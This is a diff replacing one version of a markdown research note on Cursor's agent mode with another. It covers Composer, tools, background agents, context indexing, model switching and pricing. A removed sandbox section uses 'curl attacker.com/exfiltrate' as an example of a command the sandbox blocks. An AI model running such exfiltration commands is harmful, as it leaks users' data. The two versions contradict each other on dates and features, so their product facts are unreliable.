@@ -1,617 +1,536 @@
-# Cursor AI Editor — Agent Mode Deep Dive
+# Cursor AI Agent Mode: Deep Research
 
-> Research compiled: March 2026  
-> Sources: cursor.com, cursor.com/changelog/2-0, cometapi.com analysis, Cursor docs
+> Comprehensive analysis of Cursor's agentic coding architecture, Composer vs Agent mode, background agents, model switching, context building, and comparison with VS Code Copilot.
+> Last updated: March 2026
 
 ---
 
 ## Table of Contents
 
-1. [Overview](#overview)
-2. [Cursor 2.0 — The Agent-First Relaunch](#cursor-20--the-agent-first-relaunch)
-3. [Architecture: Composer & Agent Core](#architecture-composer--agent-core)
-4. [Agentic Flow](#agentic-flow)
-5. [Autonomy Slider: Tab → Cmd+K → Agent](#autonomy-slider-tab--cmdk--agent)
-6. [Tool Use in Agent Mode](#tool-use-in-agent-mode)
-7. [Context Management](#context-management)
-8. [Multi-Agent Orchestration](#multi-agent-orchestration)
-9. [Plan Mode](#plan-mode)
-10. [Browser Integration (GA)](#browser-integration-ga)
-11. [Sandboxed Terminals](#sandboxed-terminals)
-12. [Model Configuration](#model-configuration)
-13. [Workspace & Project Context](#workspace--project-context)
-14. [Enterprise Features](#enterprise-features)
-15. [Cursor vs. Agent Mode in VS Code Copilot](#cursor-vs-agent-mode-in-vs-code-copilot)
-16. [Comparison with Other Harnesses](#comparison-with-other-harnesses)
-17. [Sources](#sources)
+1. [Overview & History](#overview--history)
+2. [Cursor Architecture](#cursor-architecture)
+3. [Tab Completion & Inline Suggestions](#tab-completion--inline-suggestions)
+4. [Cmd+K: Inline Edits](#cmdk-inline-edits)
+5. [Composer Mode](#composer-mode)
+6. [Agent Mode](#agent-mode)
+7. [Background Agents (Cloud)](#background-agents-cloud)
+8. [Context Building & Codebase Indexing](#context-building--codebase-indexing)
+9. [Model Switching](#model-switching)
+10. [MCP Integration](#mcp-integration)
+11. [Cursor 2.0 Changes](#cursor-20-changes)
+12. [Privacy & Security](#privacy--security)
+13. [Pricing](#pricing)
+14. [Cursor vs VS Code Copilot](#cursor-vs-vs-code-copilot)
+15. [Strengths & Weaknesses](#strengths--weaknesses)
+16. [Sources](#sources)
 
 ---
 
-## Overview
+## Overview & History
 
-Cursor is an AI-first code editor (fork of VS Code) designed from the ground up to integrate AI agents as first-class collaborators in the coding workflow. Unlike extensions bolted onto existing editors, Cursor rebuilds the editor experience around AI — with agents, tool integrations (terminals, browser, semantic search), and model-centric workflows.
+**Cursor** is a VS Code fork purpose-built for AI-assisted coding. Developed by Anysphere, it launched in March 2023 and has grown to over 1 million users with 360,000+ paying customers (as of 2025). It is used by engineers at NVIDIA, Y Combinator-backed companies, and over half the Fortune 500.
 
-**Cursor 2.0** (released October 29, 2025) is a major pivot: Cursor shipped its own **purpose-built coding model (Composer)**, a reimagined multi-agent UI, parallel agent execution, and production-ready sandboxed terminals. This release repositioned Cursor from "an editor with AI features" to "a full-stack platform for agent-centric software engineering."
+Unlike VS Code + Copilot (where AI is bolted on), Cursor bakes AI into every layer: the editor UI, the indexing system, the prompt construction, and the agent loop. The company describes itself as "an applied research team focused on building the future of software development."
 
-### Key Facts
+> "My favorite enterprise AI service is Cursor. Every one of our engineers, some 40,000, are now assisted by AI and our productivity has gone up incredibly."
+> — Jensen Huang, CEO, NVIDIA
 
-- **Type**: Full IDE (VS Code fork) + agent platform
-- **License**: Proprietary (commercial)
-- **Pricing**: Free Hobby plan + paid Pro/Business
-- **Primary model**: Composer (in-house) + Claude/GPT/Gemini
-- **Platform**: macOS, Windows, Linux
-- **Website**: cursor.com
+> "The best LLM applications have an autonomy slider: you control how much independence to give the AI. In Cursor, you can do Tab completion, Cmd+K for targeted edits, or you can let it rip with the full autonomy agentic version."
+> — Andrej Karpathy, CEO, Eureka Labs
 
----
+### Key milestones
 
-## Cursor 2.0 — The Agent-First Relaunch
-
-Cursor 2.0 is built around three interlocking ideas:
-
-### 1. Agent-First Editor Design
-
-Cursor 2.0 treats agents as **managed objects** in the editor:
-- Agents visible in a sidebar as named, manageable processes
-- Each agent has its own logs, inputs, and outputs
-- Agents execute **plans** (multi-step strategies) against the repo
-- Plans can be inspected, paused, and reviewed before/during execution
-
-This reframes AI actions from "chat responses" to "orchestratable tasks" — each with inputs, logs, and outputs that engineers can audit.
-
-### 2. Composer — Purpose-Built Coding Model
-
-Cursor's first in-house model, **Composer**, is trained and optimized specifically for:
-- Agentic interactions inside the Cursor environment
-- Multi-step coding workflows (plan → edit → test → iterate)
-- Speed: ~4× faster than similarly capable general models
-- Most turns complete in under 30 seconds
-
-**Training approach:**
-- Trained with access to codebase tools *during training* (semantic search, edit runners)
-- Optimized with reinforcement learning (RL) for fast, reliable code changes
-- Architecture: Likely MoE (Mixture-of-Experts) based on coverage of training recipe
-- Understands tool use patterns from the Cursor environment natively
-
-### 3. Parallel, Isolated Agent Execution
-
-Up to **8 agents run in parallel** on the same project:
-- Each agent operates in an **isolated copy** of the codebase
-- Isolation via git worktrees (local) or remote worker sandboxes
-- No file conflicts between parallel agents
-- Enables "what if" exploration: run 8 different fix strategies, compare results
+| Date | Event |
+|------|-------|
+| Mar 2023 | Cursor launches as VS Code fork |
+| 2024 | Composer mode introduced |
+| Feb 2025 | Agent mode reaches mainstream; 1M users |
+| May 2025 | Background Agents (cloud) launch |
+| Aug 2025 | Cursor CLI (agent in any terminal) preview |
+| Jan 2026 | Cursor 2.0 ships with multi-model planning |
 
 ---
 
-## Architecture: Composer & Agent Core
+## Cursor Architecture
 
-### Cursor's Tech Stack
-
-Cursor is built as a VS Code fork with deep modifications:
-- Extended extension API for agent orchestration
-- Custom model routing layer for Composer
-- Agent runtime managing process isolation and communication
-- Plan management UI components
-
-### Composer Model Architecture
+Cursor is a **VS Code fork** — it inherits the full VS Code editor, extension marketplace, and keybindings, while adding Cursor-specific AI features on top.
 
 ```
-User prompt → Composer model
-              ├── Semantic search (understands codebase)
-              ├── Edit generation (proposes file changes)
-              ├── Test runner integration
-              └── Iterative refinement
-
-Agent outputs:
-├── File diff proposals
-├── Terminal commands (sandboxed)
-├── Plan documents
-└── Assistant messages
+┌─────────────────────────────────────────────┐
+│               Cursor IDE                     │
+│  ┌───────────┐  ┌──────────────────────────┐│
+│  │ VS Code   │  │   Cursor AI Layer        ││
+│  │ Core      │  │  ┌────────┐ ┌──────────┐ ││
+│  │ (editor,  │  │  │ Tab AI │ │ Composer │ ││
+│  │ terminal, │  │  │ (next  │ │ / Agent  │ ││
+│  │ git, etc) │  │  │ token) │ │ (multi-  │ ││
+│  │           │  │  └────────┘ │ step)    │ ││
+│  │           │  │  ┌────────┐ └──────────┘ ││
+│  │           │  │  │ Cmd+K  │ ┌──────────┐ ││
+│  │           │  │  │(inline │ │Codebase  │ ││
+│  │           │  │  │ edit)  │ │ Index    │ ││
+│  │           │  │  └────────┘ └──────────┘ ││
+│  └───────────┘  └──────────────────────────┘│
+└─────────────────────────────────────────────┘
+          │
+          ▼
+   Cursor LLM Proxy (Anysphere backend)
+          │
+          ├── OpenAI GPT-5, o3, o4-mini
+          ├── Anthropic Claude Sonnet/Opus
+          ├── Google Gemini 3 Pro
+          ├── xAI Grok Code
+          └── Cursor's proprietary models (Cursor Fast)
 ```
 
-### Agent Runtime
-
-The agent runtime manages:
-- **Worktree isolation**: Each agent gets its own git worktree or cloud sandbox
-- **Plan execution**: Breaking down high-level goals into executable steps
-- **Tool dispatch**: Routing tool calls to appropriate handlers
-- **Result aggregation**: Collecting and presenting agent outputs
+**Key design principles:**
+- Codebase is **indexed** in a vector database on Anysphere's servers (or locally in privacy mode)
+- **Prompt construction** is Cursor's core IP — how it assembles context, file contents, and repo structure into optimal LLM prompts
+- **Speculative decoding** for edit application (faster diff application)
 
 ---
 
-## Agentic Flow
+## Tab Completion & Inline Suggestions
 
-### How Agent Mode Works
+Cursor's Tab completion is its most-used feature and differs from Copilot's:
 
-1. **User sends a prompt** to Composer/Agent
-2. **Model builds a plan** (optional, configurable)
-3. **Model identifies files** to read using semantic search
-4. **Model generates edits** across multiple files
-5. **Terminal commands proposed** (with sandboxed execution)
-6. **Model monitors output** — compile errors, test failures
-7. **Iterates to fix issues** found in step 6
-8. **Presents result** to user for review
-
-### Iteration Pattern
-
-```
-User: "Add comprehensive error handling to the API module"
-
-Agent turn 1:
-  → Semantic search: find all API route handlers
-  → Read: routes/auth.ts, routes/users.ts, routes/posts.ts
-  → Plan: Add try/catch to each handler, map error types to HTTP codes
-
-Agent turn 2:
-  → Edit: routes/auth.ts (add try/catch blocks)
-  → Edit: routes/users.ts (add try/catch blocks)
-  → Edit: routes/posts.ts (add try/catch blocks)
-  → Run: npx tsc --noEmit (check for TypeScript errors)
-  → Found: 2 type errors in error handling code
-
-Agent turn 3:
-  → Fix type errors (union types for error handling)
-  → Run: npx tsc --noEmit (now clean)
-  → Done: "Added error handling to 3 API route files..."
-```
-
-### Interrupt & Steer
-
-Users can interrupt at any point:
-- Type a new message to redirect
-- Use `Undo Last Edit` button to revert most recent change
-- Full undo support for granular rollback
+- **Multi-line completions**: Predicts not just the next token but the entire next edit
+- **Next edit prediction**: After accepting a completion, Cursor often predicts the *next* change you'll need to make (e.g., update a related function signature)
+- **Context-aware**: Uses the full file + relevant indexed files, not just the current cursor position
+- **Model**: Cursor uses a fast, proprietary model optimized for low-latency completions
 
 ---
 
-## Autonomy Slider: Tab → Cmd+K → Agent
+## Cmd+K: Inline Edits
 
-Cursor explicitly models AI assistance as a **spectrum of autonomy**:
+`Cmd+K` (or `Ctrl+K`) opens an inline prompt bar for **targeted edits**:
+
+- Select code → `Cmd+K` → describe the change
+- Cursor generates a diff directly in the editor
+- Accept/reject the changes inline
+- Does NOT require switching to a chat panel
+
+This is the "scalpel" of Cursor — precise, quick, targeted. Best for: renaming, refactoring a single function, adding a parameter, etc.
 
 ```
-Low autonomy ←────────────────────────────────────→ High autonomy
-     │                    │                              │
-   Tab                  Cmd+K                          Agent
-(completion)       (targeted edit)              (full autonomy)
+Select: function calculateTax(amount) { ... }
+Cmd+K → "Add support for tax exemptions and return breakdown object"
+→ Inline diff appears
+→ Accept with Tab
 ```
-
-### 1. Tab Completion
-
-- AI suggests the next token/line/block
-- User accepts with Tab
-- Zero explicit prompting
-- Fastest, most inline
-
-### 2. Cmd+K (Targeted Edit)
-
-- User selects code + writes instruction
-- AI makes a specific, scoped edit
-- Review inline diff, accept/reject
-- Good for: "change this function to be async"
-
-### 3. Agent Mode (Full Autonomy)
-
-- User describes high-level task
-- AI autonomously finds relevant files
-- Makes multi-file changes
-- Runs commands, fixes errors
-- Good for: "Add user authentication to this app"
-
-This spectrum is a deliberate design choice — developers choose how much autonomy to give the AI based on task complexity and risk tolerance.
 
 ---
 
-## Tool Use in Agent Mode
+## Composer Mode
 
-Cursor agent mode uses a rich tool set to accomplish tasks:
+**Composer** was Cursor's first multi-file editing mode. It lets you describe a task in a chat interface, and Cursor proposes edits across multiple files simultaneously.
 
-### File Tools
+### How Composer works
 
-| Tool | Description |
-|------|-------------|
-| **Semantic search** | Find code by meaning, not just text match |
-| **File read** | Read full file contents |
-| **File edit** | Apply targeted changes to files |
-| **File create** | Create new files |
-| **Directory listing** | Explore project structure |
-| **Glob/regex search** | Pattern-based file finding |
+1. Open Composer panel (`Cmd+I` or `Cmd+Shift+I`)
+2. Describe your task (e.g., "Add a user settings page with profile and notification preferences")
+3. Cursor analyzes context and proposes edits to multiple files
+4. You review a diff for each file
+5. Accept all changes at once or review file-by-file
 
-### Execution Tools
+### Composer vs Chat
 
-| Tool | Description |
-|------|-------------|
-| **Terminal** | Run shell commands (sandboxed in 2.0) |
-| **Test runner** | Execute test suites |
-| **Build runner** | Run build processes |
-
-### Intelligence Tools
-
-| Tool | Description |
-|------|-------------|
-| **Browser** | Interact with web pages, extract DOM (GA in 2.0) |
-| **LSP integration** | Get compile/lint errors from VS Code language services |
-| **Code navigation** | Jump to definitions, find references |
-
-### Tool Transparency
-
-Every tool invocation is **transparently displayed in the UI**:
-- User sees what the agent is doing in real time
-- Terminal commands shown before execution
-- File diffs presented for review
+| Feature | Chat | Composer |
+|---------|------|---------|
+| File editing | Suggests code, you apply | Directly edits files |
+| Multi-file | No | Yes |
+| Diff view | No | Yes (per-file) |
+| Context | Conversation | Full workspace scan |
+| Best for | Q&A, exploration | Implementing features |
 
 ---
 
-## Context Management
+## Agent Mode
 
-### Automatic Context Detection
+**Agent mode** is the evolution of Composer into a fully autonomous coding agent. Introduced in late 2024 / early 2025, it became Cursor's headline feature.
 
-Agent mode automatically finds relevant context:
-- **Summarized workspace structure** included in every prompt (not full codebase)
-- **Semantic search** used to find relevant files dynamically
-- Agent assembles a working set of files as it explores
+### What makes it "agentic"
 
-### Manual Context Addition
+In agent mode, Cursor:
+
+1. **Plans autonomously**: Determines which files to read, edit, and create
+2. **Runs terminal commands**: `npm install`, `cargo build`, `python -m pytest`, etc.
+3. **Reads documentation**: Can browse the web to understand libraries or APIs
+4. **Iterates on errors**: If a command fails or tests fail, it reads the output and tries to fix
+5. **Loops until done**: Keeps iterating until tests pass or the task is complete
+
+### Tool set available to the agent
 
 ```
-@file:src/auth.ts     — Add specific file
-@folder:src/api/      — Add entire folder
-@url:https://...      — Fetch URL content as context
-#file:src/auth.ts     — Drag-and-drop or button
+codebase_search    - Semantic search across indexed codebase
+read_file          - Read specific file by path + line range
+edit_file          - Apply changes to a file
+create_file        - Create new files
+delete_file        - Delete files
+run_terminal_cmd   - Execute shell commands (with approval)
+list_directory     - List files in a directory
+grep_search        - Regex search across files
+web_search         - Search the internet for documentation
+fetch_url          - Fetch a specific URL
 ```
 
-### AGENTS.md / Project Instructions
+### Agent mode loop
 
-Cursor supports project-level instruction files:
-- `.cursorrules` — Legacy project rules file
-- `AGENTS.md` — Project context for AI agents (newer standard)
+```
+User task
+    │
+    ▼
+Determine context (which files are relevant?)
+    │
+    ▼
+Read relevant files
+    │
+    ▼
+Propose edits / run commands
+    │
+    ▼
+Check output / run tests
+    │   ┌─────────────────────┐
+    ├───┤ Error? ──► Fix loop │
+    │   └─────────────────────┘
+    ▼
+Report completion to user
+```
 
-These files are loaded at agent session start to provide:
-- Coding conventions
-- Project architecture notes
-- Preferred libraries and patterns
+### Terminal command approval
 
-### Context Window Strategy
+By default, agent mode **requires approval** before running terminal commands. This prevents accidental data loss or unintended side effects. Users can configure:
 
-Cursor uses a multi-tiered context approach:
-1. **Summarized project structure** (always present, token-efficient)
-2. **Dynamically fetched file contents** (loaded on demand via semantic search)
-3. **Tool call results** (accumulated during session)
-4. **Conversation history** (up to context limit)
+- **Auto-approve**: Certain command patterns (e.g., `npm test`, `cargo check`)
+- **Always ask**: Default; every command shown with Accept/Reject
+- **Block all**: Terminal access disabled
 
-Unlike Aider's static repo map, Cursor's semantic search is **dynamic** — it can discover relevant files mid-session based on what it learns.
+### Context specification
+
+The agent automatically determines which files to read, but users can guide it:
+
+```
+@filename.py       - Include specific file
+#web               - Allow web browsing
+@Docs              - Include documentation context
+@Codebase          - Trigger full codebase search
+#terminal          - Include recent terminal output
+```
 
 ---
 
-## Multi-Agent Orchestration
+## Background Agents (Cloud)
 
-### Cursor 2.0 Multi-Agent Features
+**Background Agents** (launched May 2025) move the agent execution from your local machine to the cloud. This enables:
 
-**Parallel execution:**
-- Up to 8 agents simultaneously
-- Each in isolated git worktree or cloud sandbox
-- Sidebar shows all active agents with status
-- Compare results without conflicts
+- **Long-running tasks**: Run for hours without tying up your machine
+- **Parallel agents**: Multiple agents working on different tasks simultaneously
+- **Firewall-isolated environments**: Each agent runs in a sandboxed VM
+- **Session resumption**: Pick up where you left off
 
-**Plan management:**
-- Create named plans ("Add authentication", "Fix performance")
-- Plans have explicit steps that can be reviewed
-- Execute plans in foreground or background
+### Architecture
 
-**Plan Mode:**
-1. Create plan with one model (strong reasoner)
-2. Review and refine the plan
-3. Execute with another model (fast executor)
-
-### Agent Sidebar
-
-The new Agent Sidebar in Cursor 2.0:
 ```
-┌─ Agents ──────────────────────┐
-│ ● auth-feature (running)       │
-│   Step 3/7: Adding JWT tokens  │
-│                                │
-│ ✓ bug-fix-107 (done)          │
-│   Fixed null pointer in user   │
-│                                │
-│ ● perf-opt (running)           │
-│   Step 1/4: Profiling API...   │
-│                                │
-│ [+ New Agent]                  │
-└────────────────────────────────┘
+User triggers task (from IDE or cursor.com)
+    │
+    ▼
+Background Agent spawned in cloud VM
+    │
+    ├── Clones your repo into isolated environment
+    ├── Runs agent loop (same tool set as local)
+    ├── Commits changes to a new branch
+    └── Opens PR for review
 ```
 
-### Background Agents
+### Configuration
 
-Agents can run in the background while developers work on other tasks:
-- Cloud agents: 99.9% reliability, faster startup
-- Background visibility in sidebar
-- Notifications when done or when input needed
+In the Cursor dashboard (Business/Enterprise plans), workspace admins can configure:
+- Default model for background agents
+- Allowed network domains (firewall rules)
+- Repository access permissions
+- Auto-PR settings
+
+### From the UI
+
+```
+1. Open Cursor
+2. Chat panel → "Run in background"  (or cursor.com/agents)
+3. Describe task
+4. Choose model
+5. Cursor launches cloud agent
+6. Monitor progress in the Agents panel
+7. Review PR when complete
+```
 
 ---
 
-## Plan Mode
+## Context Building & Codebase Indexing
 
-Plan Mode separates **thinking** from **acting**:
+Cursor's context building is one of its most important differentiators:
 
-### Plan Mode Workflow
+### Codebase Index
 
-1. **Create plan**: User describes high-level goal
-2. **Model plans**: Agent analyzes codebase, proposes step-by-step approach
-3. **Review**: User reads the plan, adds comments, modifies steps
-4. **Execute**: Agent follows the reviewed plan to make changes
+When you open a project in Cursor:
 
-### Plan Format
+1. Cursor **scans the entire codebase** and creates embeddings (vector representations) of every file
+2. This index is stored on Anysphere's servers (or locally in Privacy Mode)
+3. When you ask a question or run an agent task, Cursor **semantically searches** this index to find the most relevant files
+
+This is fundamentally different from Aider's tree-sitter repo map — Cursor uses embedding-based semantic search, which handles natural language queries better.
+
+### Context sources
+
+| Source | How triggered |
+|--------|--------------|
+| Indexed codebase | Automatic, always available |
+| Open files | Always included in context |
+| `@filename` mentions | Manual |
+| Terminal output | `#terminal` reference |
+| Git diff | Automatic in relevant contexts |
+| Web search results | `#web` or `@Docs` |
+| Recent chat history | Automatic |
+| Custom instructions | `.cursorrules` file |
+
+### `.cursorrules` file
+
+Cursor reads a `.cursorrules` file in your project root for custom instructions:
 
 ```markdown
-# Plan: Add OAuth Authentication
-
-## Analysis
-Current auth uses username/password. Need to add Google OAuth.
-
-## Steps
-
-1. Install dependencies: passport, passport-google-oauth20
-2. Create OAuth callback route in src/routes/auth.ts
-3. Add Google credentials to environment config
-4. Update frontend login page with Google Sign-In button
-5. Add user profile sync from OAuth token
-6. Write integration tests for OAuth flow
-
-## Files to modify
-- src/routes/auth.ts
-- src/config/env.ts
-- frontend/components/LoginPage.tsx
-- tests/integration/auth.test.ts
+# Project conventions
+- Use TypeScript strict mode
+- Prefer functional components over class components
+- All API calls should go through `src/api/client.ts`
+- Tests use Jest + React Testing Library
+- Never modify files in `src/generated/`
 ```
 
-User reviews and approves before execution begins.
+This gives Cursor persistent context about your project's conventions without needing to re-specify every session.
 
 ---
 
-## Browser Integration (GA)
+## Model Switching
 
-Cursor 2.0 ships the **browser tool** as generally available:
+Cursor supports multiple LLMs and lets you switch freely between them.
 
-### Capabilities
+### Available models (2025–2026)
 
-- Navigate to URLs
-- Interact with DOM elements (click, type, scroll)
-- Capture screenshots
-- Extract structured data from pages
-- Forward console logs to agent
+| Provider | Models |
+|----------|--------|
+| OpenAI | GPT-5, GPT-4.1, GPT-4.1-mini, o3, o4-mini |
+| Anthropic | Claude Sonnet 4.5, Claude Opus 4.5 |
+| Google | Gemini 3 Pro |
+| xAI | Grok Code |
+| Cursor | Cursor Fast (proprietary, low latency) |
 
-### Use Cases
+### How to switch
 
-```
-"Test the checkout flow and report any errors"
-→ Agent opens localhost:3000
-→ Navigates to /checkout
-→ Fills in test data
-→ Captures screenshot of error
-→ Reads console logs
-→ Reports: "Payment form crashes on empty card number"
+- **Model dropdown**: In the chat/composer/agent panel, click the model selector
+- **Auto mode**: Cursor picks the model automatically based on task type
+- **Per-task**: Different tasks can use different models in the same session
 
-"Check the docs for the new API endpoint format"
-→ Agent opens docs.stripe.com/api
-→ Extracts relevant endpoint format
-→ Updates implementation to match
-```
+### Cursor 2.0's dual-model planning
 
-### Browser + Edit Loop
+From the Codecademy writeup on Cursor 2.0:
+> "Cursor 2.0 separates planning from execution. Developers can assign one model to create a plan and a different model to build it. Planning can happen in the background while other work continues, or multiple agents can generate competing plans for review."
 
-```
-Agent reads DOM → Identifies bug → Edits code → Re-runs browser → Verifies fix
-```
+This mirrors Aider's architect mode — a reasoning-heavy model for planning, a faster model for execution.
 
----
+### Cost management
 
-## Sandboxed Terminals (GA on macOS)
+Cursor uses a **credit system** on paid plans:
+- **Hobby**: Limited free requests/month
+- **Pro ($20/mo)**: 500 fast requests, unlimited slow requests
+- **Business ($40/user/mo)**: More fast requests, admin controls
+- **Ultra ($200/mo)**: Maximum limits
 
-Cursor 2.0 ships sandboxed terminal execution as GA on macOS:
-
-### Sandbox Properties
-
-- Filesystem: Read/write access to workspace only
-- Network: Blocked by default
-- Allowlist: Specific commands can be whitelisted for network
-- Admin controls: Enterprise-configurable policies
-
-### Command Execution Flow
-
-```
-Agent wants to run: "npm run build"
-
-1. Sandbox checks: Is "npm run build" in allowlist?
-2. If allowed: Execute in sandbox, capture output
-3. Agent receives stdout/stderr
-4. Agent can react to errors
-
-Agent wants to run: "curl attacker.com/exfiltrate"
-
-1. Sandbox checks: Is curl to external domain allowed?
-2. Blocked: Network access denied
-3. Agent informed of constraint
-```
-
-### Why Sandboxing Matters
-
-As agents make more autonomous decisions about what commands to run, sandboxing becomes critical:
-- Prevents accidental/malicious data exfiltration
-- Limits blast radius of agent mistakes
-- Enables safer full-auto agent execution
+"Fast" requests use top-tier models (GPT-5, Opus). "Slow" requests fall back to lighter models.
 
 ---
 
-## Model Configuration
+## MCP Integration
 
-### Available Models in Cursor
+Cursor supports **Model Context Protocol (MCP)** servers for extending the agent's toolset.
 
-Cursor supports multiple model providers:
+### Configuration
 
-**In-house:**
-- Composer — purpose-built fast coding model
+In `~/.cursor/mcp.json`:
 
-**Anthropic:**
-- Claude Sonnet 3.5 / 3.7
-- Claude Opus (via Plan mode)
-
-**OpenAI:**
-- GPT-4o / GPT-4o mini
-- o1 / o3 / o4-mini
-
-**Google:**
-- Gemini 2.5 Pro / Flash
-
-**Custom:**
-- Any OpenAI-compatible API (CometAPI, etc.)
-
-### Model Selection Strategy
-
-Cursor's recommended approach:
-- **Composer**: Default for most agentic tasks (fastest)
-- **Opus / o1 / o3**: For planning and complex architectural decisions
-- **GPT-4o / Sonnet**: For balanced quality/speed
-
-### API Key Configuration
-
+```json
+{
+  "mcpServers": {
+    "github": {
+      "command": "npx",
+      "args": ["-y", "@modelcontextprotocol/server-github"],
+      "env": {
+        "GITHUB_TOKEN": "ghp_..."
+      }
+    },
+    "postgres": {
+      "command": "npx",
+      "args": ["-y", "@modelcontextprotocol/server-postgres"],
+      "env": {
+        "DATABASE_URL": "postgresql://..."
+      }
+    }
+  }
+}
 ```
-Cursor Settings → Models → API Keys
 
-OpenAI: sk-...
-Anthropic: sk-ant-...
-Google: AI...
-Custom Base URL: https://api.custom.com/v1
-```
+With MCP, the Cursor agent can:
+- Query your database schema and run queries
+- Interact with GitHub issues and PRs
+- Access Figma designs
+- Read Jira tickets
+- Connect to any custom MCP server you build
 
 ---
 
-## Workspace & Project Context
+## Cursor 2.0 Changes
 
-### .cursorrules (Legacy)
+Cursor 2.0 (shipped Jan 2026) was a significant architectural rethink:
+
+### Multi-agent subagent system
+
+The "Composer model" in Cursor 2.0 is not just the LLM — it's an orchestration layer:
 
 ```
-# .cursorrules
-You are an expert TypeScript developer.
-Always use strict TypeScript.
-Prefer functional patterns over classes.
-Use Zod for validation.
-Write tests for all new functions.
+User task
+    │
+    ▼
+Planner agent (high-intelligence model)
+    │
+    ├── Spawns subagents for parallel work
+    │   ├── Subagent A: frontend changes
+    │   ├── Subagent B: backend changes
+    │   └── Subagent C: tests
+    │
+    ▼
+Coordinator merges results
+    │
+    ▼
+User reviews unified PR/diff
 ```
 
-### AGENTS.md (Current Standard)
+### Cursor Fast model
 
-```markdown
-# Project: MyApp API
+Cursor 2.0 shipped a proprietary model ("Cursor Fast") optimized for:
+- Low-latency tab completion
+- Fast inline edits
+- Routine Composer tasks
 
-## Tech Stack
-- Node.js + Express + TypeScript
-- PostgreSQL + Prisma ORM
-- Jest for testing
+This reduces reliance on expensive frontier models for everyday tasks.
 
-## Conventions
-- Use async/await (never callbacks)
-- Error handling: always use Result<T, E> pattern
-- Logging: use pino logger, never console.log
+### Redesigned UI
 
-## Testing
-- Run: npm test
-- Test files: *.test.ts adjacent to implementation
-```
-
-### Workspace Indexing
-
-Cursor indexes the workspace for semantic search:
-- Builds vector embeddings of code
-- Enables "find code by meaning"
-- Updates incrementally as files change
-- Used by agent mode to discover relevant context without explicit `@file` references
+- Agent panel replaces Composer as the primary interface
+- Unified task history
+- Better parallel task visualization
 
 ---
 
-## Enterprise Features
+## Privacy & Security
 
-### Team & Business Plans
+Cursor has invested heavily in privacy features for enterprise adoption:
 
-**Centralized billing:**
-- Per-seat pricing
-- Usage dashboards
-- Team spending limits
+### Privacy Mode
 
-**Privacy modes:**
-- Privacy mode: No code sent to Cursor servers
-- Local inference option (for sensitive codebases)
+In Privacy Mode (`Settings > Privacy Mode`):
+- Code is **never stored** on Anysphere's servers
+- Codebase indexing happens locally only
+- Prompts are sent directly to LLM providers without logging
 
-**Admin controls:**
-- Allowlist/denylist terminal commands for agents
-- Configure approved model providers
-- Audit logs for agent activity
+### SOC 2 Type II certification
 
-### Cursor for Teams
+Cursor is SOC 2 Type II certified — required by many enterprise procurement teams.
 
-- Shared cursor rules (team-wide conventions)
-- Shared custom agents
-- Consistent AI behavior across team
+### Enterprise controls
 
----
-
-## Cursor vs. Agent Mode in VS Code Copilot
-
-| Feature | Cursor Agent Mode | Copilot Agent Mode (VS Code) |
-|---------|------------------|-------------------------------|
-| **Editor base** | VS Code fork | VS Code extension |
-| **In-house model** | ✅ Composer | ❌ (uses OpenAI/Anthropic) |
-| **Multi-agent** | ✅ Up to 8 parallel | ❌ Single agent |
-| **Sandboxed terminal** | ✅ GA on macOS | ❌ |
-| **Browser** | ✅ GA | ❌ |
-| **Plan mode** | ✅ Native | Limited |
-| **Workspace index** | ✅ Vector embeddings | ✅ (summarized structure) |
-| **Pricing** | Paid subscription | Free with GitHub Copilot |
-| **Open source** | ❌ | VS Code is open source |
-| **Latency** | ✅ ~30s turns (Composer) | Depends on model |
+Business/Enterprise plans add:
+- SSO (SAML, Okta, etc.)
+- Audit logs of agent actions
+- Organization-wide model restrictions
+- IP allowlisting
+- Zero data retention agreements
 
 ---
 
-## Comparison with Other Harnesses
+## Pricing
 
-| Feature | Cursor | Claude Code | OpenCode | Aider | Cline |
-|---------|--------|-------------|----------|-------|-------|
-| **Interface** | IDE (VS Code fork) | Terminal + IDE | Terminal TUI | Terminal | VS Code ext |
-| **Open Source** | ❌ | ❌ | ✅ MIT | ✅ | ✅ |
-| **In-house model** | ✅ Composer | ❌ | ❌ | ❌ | ❌ |
-| **Multi-agent** | ✅ 8 parallel | ✅ Subagents | ✅ Multi-session | ❌ | ❌ |
-| **Browser** | ✅ GA | ✅ Chrome | ❌ | ❌ | ✅ |
-| **Sandboxed terminal** | ✅ (macOS) | ✅ (optional) | ❌ | ❌ | ❌ |
-| **Semantic search** | ✅ Vector index | ✅ (tools) | ✅ Sourcegraph | ✅ Repo map | ✅ |
-| **MCP support** | ❌ | ✅ | ✅ | ❌ | ✅ |
-| **Git integration** | ✅ | ✅ | Limited | ✅ Deep | ✅ |
-| **Plan mode** | ✅ Native | ✅ | ✅ | ✅ (architect) | ❌ |
-| **Cloud agents** | ✅ | ✅ | ❌ | ❌ | ❌ |
+| Plan | Price | Features |
+|------|-------|---------|
+| Hobby | Free | 2000 completions/month, 50 slow requests |
+| Pro | $20/month | 500 fast requests, unlimited slow, background agents |
+| Business | $40/user/month | Pro + admin controls, SSO, audit logs |
+| Ultra | $200/month | Maximum request limits, priority |
 
-### Cursor's Unique Advantages
+---
 
-1. **Composer model**: The only major coding agent with a purpose-built in-house model optimized end-to-end for the agentic coding workflow
-2. **4× speed**: Sub-30-second turns make the edit loop feel interactive rather than batched
-3. **True parallel agents**: 8 concurrent agents with file isolation — not available in any other tool
-4. **Full IDE integration**: Tab completion + targeted edits + full agent in one tool, all from same interface
-5. **Production sandboxing**: GA sandboxed terminals with network isolation
+## Cursor vs VS Code Copilot
 
-### Cursor's Limitations
+| Feature | Cursor | GitHub Copilot (VS Code) |
+|---------|--------|--------------------------|
+| Editor | Fork of VS Code | Extension in VS Code |
+| Tab completion | Custom model, next-edit prediction | Copilot model |
+| Codebase indexing | Deep vector embedding (Anysphere servers) | `@workspace` semantic search |
+| Agent mode | ✅ Full autonomy, terminal, web | ✅ Agent mode (Feb 2025) |
+| Background agents | ✅ Cloud VMs | ✅ Cloud (Copilot Workspace) |
+| Multi-file editing | ✅ Native | ✅ Copilot Edits |
+| Model choice | GPT-5, Opus, Gemini, Grok, Cursor | GPT-4o, o3-mini, Sonnet (limited) |
+| MCP support | ✅ | ✅ |
+| Privacy mode | ✅ SOC2 certified | ✅ (GitHub's data policy) |
+| VS Code extensions | ✅ (full compatibility) | ✅ |
+| Open source | ❌ (proprietary) | ❌ (proprietary) |
+| Pricing | $20/mo (Pro) | $10/mo (individual) |
+| Git integration | Via VS Code built-in | Via GitHub deep integration |
+| GitHub.com features | Via MCP | ✅ Native (issues, PRs, Workspace) |
+| Enterprise | $40/user/mo | $19/user/mo (Business) |
 
